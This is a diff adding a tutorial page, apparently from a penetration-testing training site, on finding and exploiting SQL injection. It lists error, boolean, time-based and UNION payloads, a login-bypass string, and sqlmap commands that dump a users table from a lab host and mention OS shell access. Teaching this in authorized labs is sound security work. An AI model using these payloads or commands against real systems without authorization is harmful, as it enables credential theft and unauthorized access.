@@ -1,0 +1,240 @@
+---
+title: SQL Injection
+description: Practical SQL injection testing — recognizing candidate parameters, manual testing (error, boolean, time-based, UNION), authentication bypass, and when and how to use SQLMap.
+section: web
+phase: 3
+order: 6
+difficulty: intermediate
+draft: false
+tags: ['sqli', 'sql', 'injection', 'sqlmap', 'database', 'manual-testing']
+updated: 2026-08-08
+---
+
+import Alert from '../../../components/ui/Alert.astro';
+import Badge from '../../../components/ui/Badge.astro';
+import CodeBlock from '../../../components/ui/CodeBlock.astro';
+import SourceTag from '../../../components/ui/SourceTag.astro';
+
+## What SQL injection is
+
+A web application often builds database queries by putting user input directly into the query text. SQL injection (SQLi) happens when that input is treated as SQL instead of data, letting you change the query the server executes.
+
+<CodeBlock
+  lang="text"
+  title="Vulnerable query construction"
+  code={`App code (conceptually):
+  SELECT * FROM products WHERE id = '$input'
+
+Your input:  1' OR '1'='1
+
+Query that runs:
+  SELECT * FROM products WHERE id = '1' OR '1'='1'
+                                     ^^^^^^^ always true
+`}
+/>
+
+**Why it matters:** it is a direct line to the database — potentially every row in every table, including user credentials.
+
+## How to recognize possible SQLi
+
+Look for parameters that flow into data lookups:
+
+- `?id=`, `?product=`, `?user=`, `?cat=`, `?page=` values that fetch rows.
+- Login and search forms.
+- Sort/order parameters.
+- API endpoints returning JSON of single records.
+
+If the parameter looks like it is used to look something up, it is a SQLi candidate.
+
+## Manual testing first
+
+<SourceTag source="practical" /> **Manual testing comes before automation.** SQLMap is powerful, but you need to understand what it is reporting to trust it — and in many lab tasks you must demonstrate a manual understanding before a tool will find the same thing. Manual testing also tells you *which* class of injection exists so SQLMap runs the right checks.
+
+### Step 1 — Break the query
+
+Inject a quote and watch what changes:
+
+<CodeBlock
+  lang="text"
+  title="First probes"
+  code={`?id=42        -> 200, normal
+?id=42'        -> 500 / error / empty   (query broke!)
+?id=42''       -> 200, normal again      (two quotes fix it)
+`}
+/>
+
+- **Purpose:** determine whether the input is inside a SQL string.
+- **Expected result:** a single quote changes the response; doubled quotes restore it.
+- **Investigate next:** classify the injection type (error, boolean, time, union).
+
+### Step 2 — Error-based indicators
+
+If the app reveals database errors, they can be explicit:
+
+<CodeBlock
+  lang="text"
+  title="What an error leak looks like"
+  code={`You have an error in your SQL syntax; check the manual
+that corresponds to your MariaDB server version
+for the right syntax to use near ''1''' at line 1
+`}
+/>
+
+- The error names the DBMS (MySQL/MariaDB here) and shows the query shape.
+- **Investigate next:** use `extractvalue`, `updatexml`, or a UNION to turn the error into data — or move to UNION/boolean testing.
+
+### Step 3 — Boolean-based
+
+When errors are hidden, ask the database yes/no questions:
+
+<CodeBlock
+  lang="text"
+  title="Boolean probes"
+  code={`?id=42 AND 1=1   -> 200, normal (true)
+?id=42 AND 1=2   -> 200, empty  (false)
+
+?id=42 AND SUBSTRING(user(),1,1)='a'   -> true?
+?id=42 AND SUBSTRING(user(),1,1)='b'   -> true?
+=> brute-force the username one character at a time
+`}
+/>
+
+- **Purpose:** confirm injection and extract data when errors are suppressed.
+- **Expected result:** the page differs between true and false statements.
+- **Investigate next:** character-by-character extraction (slow) or hand the logic to SQLMap.
+
+### Step 4 — Time-based (blind)
+
+When the page looks identical for true and false, make the database sleep:
+
+<CodeBlock
+  lang="text"
+  title="Time-based probes"
+  code={`?id=42 AND SLEEP(5)            -> page pauses ~5s
+?id=42 AND IF(1=1,SLEEP(5),0) -> pauses (condition true)
+?id=42 AND IF(1=2,SLEEP(5),0) -> no pause
+`}
+/>
+
+- **Purpose:** detect injection and extract data when no output differs.
+- **Expected result:** a measurable delay that you control with the condition.
+- **Investigate next:** confirm with a baseline request first — a slow page is not automatically vulnerable.
+
+### Step 5 — UNION
+
+To read data in the response itself, extend the query with UNION:
+
+<CodeBlock
+  lang="text"
+  title="UNION workflow"
+  code={`?id=42 ORDER BY 5            -> error? then fewer columns
+?id=42 ORDER BY 4            -> works? 4 columns
+?id=42 UNION SELECT 1,2,3,4  -> see where 2 and 3 appear
+?id=42 UNION SELECT 1,database(),user(),4  -> read data
+`}
+/>
+
+- **Purpose:** retrieve arbitrary data directly in the page.
+- **Expected result:** your injected values appear in the response, telling you the column count and output positions.
+- **Investigate next:** read `table_name` from `information_schema.tables`, then dump credentials.
+
+<Alert variant="info" title="Why ORDER BY first">
+  `ORDER BY n` fails once `n` exceeds the real column count — a fast way to find the number of columns before writing a UNION payload.
+</Alert>
+
+### Step 6 — Authentication bypass
+
+A login query is vulnerable to the same idea:
+
+<CodeBlock
+  lang="text"
+  title="Auth bypass probes (authorized lab)"
+  code={`username: admin' --
+username: admin' OR '1'='1
+password: anything
+
+resulting query: SELECT * FROM users WHERE name='admin' --' AND pass='...'
+                                              ^^^^^ the rest is commented out
+`}
+/>
+
+- **Purpose:** reach the post-login functionality when the login is injectable.
+- **Expected result:** authenticated as `admin` without knowing the password.
+- **Investigate next:** confirm the account is real and in scope before continuing.
+
+## SQLMap methodology
+
+Once manual testing confirms an injectable parameter, SQLMap can map and dump the database:
+
+<CodeBlock
+  lang="bash"
+  title="SQLMap basics"
+  code={`# Confirm + enumerate databases
+sqlmap -u "http://10.10.10.42/products?id=42" --batch
+
+# With a POST body or cookie
+sqlmap -u "http://10.10.10.42/login" --data "user=a&pass=b" --batch
+
+# Enumerate tables in the current DB
+sqlmap -u "http://10.10.10.42/products?id=42" --tables
+
+# Dump a specific table's data
+sqlmap -u "http://10.10.10.42/products?id=42" -T users --dump
+
+# Give it an authenticated session when needed
+sqlmap -u "..." --cookie "PHPSESSID=xyz789"
+`}
+/>
+
+### Common SQLMap options
+
+| Option | Purpose |
+|---|---|
+| `--batch` | Never ask questions; use defaults |
+| `--level` / `--risk` | Increase test depth/aggressiveness (defaults are 1/1; level 3+ for headers/cookies) |
+| `--dbs` | List databases |
+| `--tables` | List tables in the current database |
+| `-T users --dump` | Dump the `users` table |
+| `--dbms=mysql` | Specify the DBMS to save time |
+| `--threads` | Faster (but noisier) |
+| `--cookie` | Provide your session for authenticated injection points |
+| `--os-shell` | Attempt OS command execution via DB (advanced; see [Web Shells & Initial Access](/guides/web/web-shells-initial-access)) |
+
+### Interpreting results
+
+- **`parameter 'id' is vulnerable`** — the confirmation line; record the exact payload SQLMap used.
+- **DBMS identified** (e.g., `MySQL 5.7`) — drives later exploitation.
+- **Dumped hashes** — often the final goal; hand them to hash cracking in a later phase.
+- **Logged results** — SQLMap saves its requests; keep them as evidence.
+
+<Alert variant="warning" title="SQLMap is not a black box">
+  Read what SQLMap says. If it reports a time-based injection, verify it manually with one `SLEEP` probe. If it dumps tables you did not expect, confirm they exist. Trust, but verify — the report depends on it.
+</Alert>
+
+## Common mistakes
+
+- **Jumping straight to SQLMap** without manual confirmation — you cannot interpret what you never tested.
+- **Forgetting `--cookie`** and missing authenticated injection points.
+- **Running `--risk 3` on everything** — destructive payloads can break lab data.
+- **Ignoring error messages** that hand you the DBMS name for free.
+- **Not testing login and search forms** — the two most common injection points in labs.
+- **Dumping everything blindly** instead of targeting the database and tables that matter.
+
+## Quick reference
+
+| Probe | What it tells you |
+|---|---|
+| `'` vs `''` | Whether input is inside a string |
+| `AND 1=1` vs `AND 1=2` | Boolean injection confirmed |
+| `AND SLEEP(5)` | Time-based / blind injection |
+| `ORDER BY n` | Column count |
+| `UNION SELECT 1,2,3` | Output positions for data extraction |
+| `admin' --` | Authentication bypass possibility |
+
+## Related guides
+
+- [Web Fundamentals](/guides/web/web-fundamentals) — parameters and why they reach the database.
+- [HTTP Requests & Responses](/guides/web/http-requests-responses) — the "interesting response differences" that reveal SQLi.
+- [Authentication & Authorization](/guides/web/authentication-authorization) — login testing context.
+- [Web Shells & Initial Access](/guides/web/web-shells-initial-access) — what a `--os-shell` or dumped credential can lead to.
+- [Web Exploitation Methodology](/guides/web/web-exploitation-methodology) — where SQLi fits in the overall flow.
